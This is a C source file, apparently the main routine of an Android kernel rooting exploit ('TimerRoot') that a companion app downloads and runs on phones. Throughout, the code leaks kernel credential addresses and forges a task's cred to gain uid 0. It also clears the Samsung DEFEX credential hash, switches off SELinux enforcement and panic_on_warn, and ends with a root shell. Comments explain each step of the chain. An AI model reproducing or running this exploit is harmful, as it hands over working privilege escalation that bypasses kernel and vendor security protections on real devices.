            "usage: %s --conf <conf> [--protocol N] [--samsung]"
            " [ids|leak|shell|fake|permissive] [target|selfcheck|probe|cpu N]\n",
            argv0 ? argv0 : "timer");
}

/*
 * The app and the binary are shipped separately: the app can download a new
 * timer without being updated itself.  Older apps start the binary without
 * --conf (and without --protocol), which would otherwise make it run a plant
 * with the wrong/absent kernel profile.  Refuse loudly instead so the log the
 * old app displays tells the user to update TimerRoot.
 */
static void old_app_notice(int app_protocol)
{
    logf("\n");
    logf("============================================================\n");
    logf("[!] BREAKING CHANGE: TimerRoot app is too old\n");
    logf("[!] OLD_APP_DETECTED app_protocol=%d required=%d\n",
         app_protocol, APP_PROTOCOL);
    /*
     * Machine-readable handshake.  The app probes an installed binary by
     * scanning for this literal, so it must stay a real string constant.
     */
    logf("[!] %s\n", TIMER_PROTOCOL_MARKER);
    logf("============================================================\n");
    logf("This timer build reads its kernel constants from conf files and\n");
    logf("must be started with --conf and --protocol. The app that started\n");
    logf("it did not, so it predates the conf-driven update.\n");
    logf("\n");
    logf("Update TimerRoot to the latest version, then install the exploit\n");
    logf("again with \"Download exploit\" (or Prepare).\n");
    logf("Refusing to run without a profile: doing so could panic the kernel.\n");
    logf("============================================================\n");
}

int main(int argc, char **argv)
{
    unsigned char *raw;
    int shell_mode = 0, leak_only = 0, ids_only = 0;
    const char *conf_path = NULL, *mode = NULL;
    int app_protocol = 0;
    int argi = 1;

    setvbuf(stdout, NULL, _IONBF, 0);
    log_open();
    logf("=== start pid=%d argc=%d argv0=\"%s\" argv1=\"%s\" ===\n",
         getpid(), argc,
         argc > 0 && argv[0] ? argv[0] : "(null)",
         argc > 1 ? argv[1] : "(none)");
    if (argc > 1 && !strcmp(argv[1], "wait"))
        return wait_child_main(argc > 2 ? argv[2] : "verify",
                               argc > 3 && !strcmp(argv[3], "samsung"));

    /*
     * The trigger re-execs this binary with argv[0]="" purely to consume the
     * execve.  Stay alive instead of exiting immediately: killer_fn SIGKILLs
     * the group as soon as the exec'ing tid disappears, so the parent
     * observes CLD_KILLED deterministically instead of racing our own exit
     * (a CLD_EXITED would send the plant down the "harmless retry" path).
     * The wait is bounded so a failed killer cannot leave an orphan behind.
     */
    if (argv[0] && argv[0][0] == '\0')
    {
        struct timespec ts = {.tv_sec = 10, .tv_nsec = 0};

        while (nanosleep(&ts, &ts) && errno == EINTR)
            ;
        _exit(42);
    }

    detect_device();

    while (argi < argc)
    {
        if (!strcmp(argv[argi], "--conf"))
        {
            if (argi + 1 >= argc)
            {
                print_usage(argv[0]);
                return 1;
            }
            conf_path = argv[argi + 1];
            argi += 2;
        }
        else if (!strcmp(argv[argi], "--protocol"))
        {
            if (argi + 1 >= argc)
            {
                print_usage(argv[0]);
                return 1;
            }
            app_protocol = atoi(argv[argi + 1]);
            argi += 2;
        }
        else if (!strcmp(argv[argi], "--samsung"))
        {
            g_samsung_stage = 1;
            argi++;
        }
        else
        {
            break;
        }
    }
    if (argi < argc)
        mode = argv[argi++];

    if (mode)
    {
        if (!strcmp(mode, "shell"))
            shell_mode = 1;
        else if (!strcmp(mode, "leak"))
            leak_only = 1;
        else if (!strcmp(mode, "permissive"))
            g_selinux_target = 1;
        else if (!strcmp(mode, "ids"))
            ids_only = 1;
        else if (!strcmp(mode, "probe"))
            g_probe = 1;
        else if (!strcmp(mode, "fake"))
            g_fake_stage = 1;
        else if (!strcmp(mode, "cpu") && argi < argc)
            g_cpu = atoi(argv[argi]);
    }

    /*
     * A missing conf means an old app.  A protocol that is present but below
     * APP_PROTOCOL catches a build that learned --conf before this handshake.
     * Protocol 0 is a manual `--conf <file>` invocation (used for probing),
     * which is allowed.
     */
    if (!conf_path || (app_protocol > 0 && app_protocol < APP_PROTOCOL))
    {
        old_app_notice(app_protocol);
        return EXIT_OLD_APP;
    }
    if (load_conf(conf_path))
        return 1;
    if (g_samsung_stage)
    {
        if (!g_cfg.samsung_mode)
        {
            fprintf(stderr,
                    "[-] --samsung requires a samsung_mode=1 profile\n");
            return 1;
        }
        if (!g_fake_stage && !g_selinux_target && !g_probe && !leak_only &&
            !ids_only && !(mode && (!strcmp(mode, "target") ||
                                    !strcmp(mode, "selfcheck"))))
        {
            fprintf(stderr, "[-] --samsung supports "
                    "fake|permissive|leak|probe|ids|target|selfcheck\n");
            return 1;
        }
    }
    logf("[+] device=%s kernel=%s pagesize=%ld profile=%s conf=%s\n",
         g_device, g_kernel, sysconf(_SC_PAGESIZE), g_tgt->name, conf_path);
    if (g_samsung_stage)
        logf("[+] samsung endgame enabled (package=%s defex=%#llx)\n",
             g_cfg.samsung_package, DEFEX_CREDS_HASH_STATIC);

    /* Lets the app confirm a downloaded binary targets this exact build.
     * Keep target=lynx for the app's existing check. */
    if (mode && !strcmp(mode, "selfcheck"))
        return selfcheck_profile() ? 1 : 0;
    if (mode && !strcmp(mode, "target"))
    {
        printf("target=lynx\ndevice=%s\nkernel=%s\npagesize=%lu\n"
               "profile=%s\nconf=%s\ntimer_site=%#llx\nprotocol=%d\n"
               "samsung=%d\n%s\n%s\n",
               g_device, g_kernel, (unsigned long)PAGE, g_tgt->name,
               conf_path, (unsigned long long)STATIC_TIMER_SITE,
               APP_PROTOCOL, g_cfg.samsung_mode, TIMER_PROTOCOL_MARKER,
               TIMER_SAMSUNG_MARKER);
        return 0;
    }

    raw = malloc(48u << 20);
    if (!raw)
        return 1;

    {
        struct rlimit rl;

        if (!getrlimit(RLIMIT_NOFILE, &rl))
        {
            rl.rlim_cur = rl.rlim_max;
            if (rl.rlim_cur > 65536)
                rl.rlim_cur = 65536;
            (void)setrlimit(RLIMIT_NOFILE, &rl);
        }
    }

    pin(g_cpu);
    logf("[+] pid=%d cpu=%d mode shell=%d fake=%d probe=%d leak=%d ids=%d\n",
         getpid(), g_cpu, shell_mode, g_fake_stage, g_probe, leak_only,
         ids_only);
    /* The Pixel default is 7 KB per CPU; the trace reads need 8 MB. */
    if (wr(TR "/buffer_size_kb", "8192\n"))
        logf("[!] buffer_size_kb write failed\n");
    enable_events();
    kick_rss();
    usleep(50000);

    if (discover_page_types(raw) != 0)
        return 1;
    if (ids_only)
        return 0;
    if (g_probe)
    {
        run_probe(raw);
        return 0;
    }

    g_base = calibrate_base(raw);
    if (!g_base)
    {
        logf("[-] base calibration failed\n");
        return 1;
    }
    prefill_timers(PREFILL_TIMERS);

    pid_t C = -1;
    int go_fd = -1, st_fd = -1;
    unsigned long long R = leak_cred(raw, &C, &go_fd, &st_fd, shell_mode,
                                     &g_child_task);
    if (!R)
    {
        logf("[-] cred leak failed\n");
        return 1;
    }
    logf("[+] child=%d cred=%#llx target=%#llx\n", C, R, R + 8);
    if (leak_only)
    {
        close(go_fd);
        close(st_fd);
        kill(C, SIGKILL);
        waitpid(C, NULL, 0);
        logf("[+] leak-only run complete\n");
        return 0;
    }
    if (g_fake_stage)
        write_ksu_script();
    ensure_pool();
    ensure_raw();

    if (g_selinux_target)
    {
        /*
         * SELinux is the only thing a uid-0 shell without capabilities
         * cannot switch off through /sys/fs/selinux.  Clear the kernel's
         * enforcing flag with one plant (fresh process, so this is the
         * first write of the run), leaving a later uid-0 shell able to
         * rewrite /data/property/persistent_properties.
         */
        struct plant_res r;

        memset(&r, 0, sizeof(r));
        for (int a = 0; a < 3 && !r.ok; a++)
        {
            logf("[+] permissive plant attempt %d/3\n", a + 1);
            run_plant(0, 1, 0, &r, raw);
        }
        if (!r.ok)
            park_forever("selinux write failed");
        logf("[+] permissive done\n");
        close(go_fd);
        close(st_fd);
        kill(C, SIGKILL);
        waitpid(C, NULL, 0);
        return 0;
    }

    if (!g_fake_stage)
    {
        struct plant_res r;
        memset(&r, 0, sizeof(r));
        for (int a = 0; a < 3 && !r.ok; a++)
        {
            logf("[+] plant attempt %d/3\n", a + 1);
            run_plant(R + CRED_UID_OFF, 1, 0, &r, raw);
        }
        if (!r.ok)
            park_forever("no successful plant");
    }
    else
    {
        struct plant_res fc;

        if (!g_child_task)
            park_forever("child task not leaked");
        memset(&fc, 0, sizeof(fc));
        if (!g_slide)
            park_forever("no KASLR slide");
        if (g_samsung_stage)
        {
            /*
             * Samsung DEFEX: task_defex_check_creds() looks this pid up in
             * creds_fast_hash and compares the stored uid with the forged
             * one.  A NULL bucket entry makes get_task_creds() return uid 0,
             * which matches the forged cred, so the violation check passes.
             * Clear it before the cred swap, in the same order as the
             * tested SamTimer chain; the child is still blocked on the go
             * pipe, so it cannot be checked before this write lands.
             */
            if (stage_write(DEFEX_CREDS_HASH_STATIC + g_slide +
                                (unsigned long long)C * 8,
                            0, "defex_hash", raw, NULL))
                park_forever("defex hash clear failed");
            logf("[+] DEFEX creds_hash[%d] cleared\n", C);
        }
        /*
         * Point task->cred at the fake cred inside the reclaimed page.  The
         * fake cred sits at node+0x18, so rb_erase publishes it through
         * *target while its own stores land on gid/suid, which
         * posix_cpu_timers_exit then zeroes.  euid and the capability set
         * are never touched, so only uid needs the explicit repair write.
         */
        if (stage_write(g_child_task + OFF_TASK_CRED, 2, "fake_cred",
                        raw, &fc))
            park_forever("fake cred write failed");
        logf("[+] fake cred A=%#llx selinux_state=%#llx\n", fc.A,
             SELINUX_STATE_STATIC + g_slide);
        if (stage_write(SELINUX_STATE_STATIC + g_slide - 7, 0,
                        "selinux", raw, NULL))
            park_forever("selinux write failed");
        if (read_panic_on_warn() != 0 &&
            stage_write(PANIC_ON_WARN_STATIC + g_slide, 0,
                        "panic_on_warn", raw, NULL))
            park_forever("panic_on_warn write failed");
        if (g_samsung_stage)
        {
            /*
             * SamTimer repairs uid/euid after the erase.  The conf-driven
             * fake-cred payload already zeroes both, but the repair is cheap
             * and keeps the Samsung path identical to the tested chain.
             */
            if (stage_write(fc.A + CRED_UID_OFF, 0, "fake_uid", raw, NULL))
                park_forever("fake uid fix failed");
            if (stage_write(fc.A + CRED_EUID_OFF, 0, "fake_euid", raw, NULL))
                park_forever("fake euid fix failed");
        }
    }
    logf("[+] cred writes landed, waking child\n");

    if (write(go_fd, "A", 1) != 1)
        logf("[!] child wake write failed\n");
    close(go_fd);

    {
        struct child_report rep;
        struct pollfd pf = {.fd = st_fd, .events = POLLIN};
        ssize_t rn = -1;

        if (poll(&pf, 1, 10000) > 0)
            rn = read(st_fd, &rep, sizeof(rep));
        close(st_fd);
        if (rn == (ssize_t)sizeof(rep) && rep.magic == CHILD_MAGIC)
        {
            logf("[+] child report uid=%d euid=%d setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
                 rep.uid, rep.euid, rep.setuid_ret, rep.setuid_errno,
                 rep.ruid, rep.reuid, rep.rsuid);
            if (rep.setuid_ret != 0 || rep.reuid != 0)
                logf("[!] child did not reach euid 0\n");
        }
        else
        {
            logf("[!] child report missing (n=%zd)\n", rn);
        }
    }

    {
        int st = 0;

        if (waitpid(C, &st, 0) == C)
            logf("[+] child exit status=%#x\n", st);
    }
    if (g_fake_stage)
        park_forever("fake cred page held; reboot to clean");
    if (g_held)
        park_forever("root shell finished; failed-plant zombies are held");
    logf("[+] done\n");
    return 0;
}
